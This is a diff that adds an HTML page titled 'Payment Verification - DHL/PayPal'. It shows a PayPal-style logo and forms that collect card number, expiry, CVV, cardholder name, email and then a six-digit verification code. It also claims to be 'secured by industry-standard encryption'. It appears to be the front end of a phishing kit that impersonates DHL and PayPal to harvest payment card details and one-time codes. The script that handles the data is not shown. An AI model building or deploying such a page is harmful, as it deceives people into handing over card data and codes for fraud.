@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Payment Verification - DHL/PayPal</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo-section">
+                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect fill='%23FF6B6B' width='100' height='100'/%3E%3Ctext x='50' y='55' font-size='60' fill='white' text-anchor='middle' font-weight='bold'%3EP%3C/text%3E%3C/svg%3E" alt="PayPal" class="logo">
+                <h1>Payment Verification System</h1>
+            </div>
+        </header>
+
+        <main>
+            <div class="card">
+                <h2>Verify Your Payment</h2>
+                <p class="subtitle">Secure verification for DHL/PayPal transactions</p>
+
+                <form id="paymentForm" method="POST">
+                    <div class="form-group">
+                        <label for="cardNumber">Card Number</label>
+                        <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                        <small>16 digits</small>
+                    </div>
+
+                    <div class="form-row">
+                        <div class="form-group">
+                            <label for="expiryDate">Expiry Date</label>
+                            <input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" maxlength="5" required>
+                        </div>
+                        <div class="form-group">
+                            <label for="cvv">CVV</label>
+                            <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="4" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="cardholderName">Cardholder Name</label>
+                        <input type="text" id="cardholderName" name="cardholderName" placeholder="John Doe" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="email">Email Address</label>
+                        <input type="email" id="email" name="email" placeholder="john@example.com" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary" id="submitBtn">Verify Payment</button>
+                </form>
+
+                <div id="successMessage" class="success-message" style="display: none;">
+                    <p>✓ Payment verified successfully!</p>
+                    <p>A verification code has been sent to your email.</p>
+                </div>
+
+                <div id="errorMessage" class="error-message" style="display: none;">
+                    <p id="errorText"></p>
+                </div>
+            </div>
+
+            <div class="card" id="otpSection" style="display: none;">
+                <h2>Enter Verification Code</h2>
+                <p class="subtitle">Check your email for the code</p>
+
+                <form id="otpForm" method="POST">
+                    <div class="form-group">
+                        <label for="otpCode">6-Digit Code</label>
+                        <input type="text" id="otpCode" name="otpCode" placeholder="000000" maxlength="6" required>
+                    </div>
+
+                    <button type="submit" class="btn btn-primary">Confirm Code</button>
+                    <button type="button" class="btn btn-secondary" onclick="resetForm()">Back to Card</button>
+                </form>
+
+                <div id="otpSuccessMessage" class="success-message" style="display: none;">
+                    <p>✓ Verification complete!</p>
+                    <p>Your payment has been processed.</p>
+                </div>
+
+                <div id="otpErrorMessage" class="error-message" style="display: none;">
+                    <p id="otpErrorText"></p>
+                </div>
+            </div>
+        </main>
+
+        <footer>
+            <p>&copy; 2025 Payment Verification System. All rights reserved.</p>
+            <p>Secured by industry-standard encryption</p>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
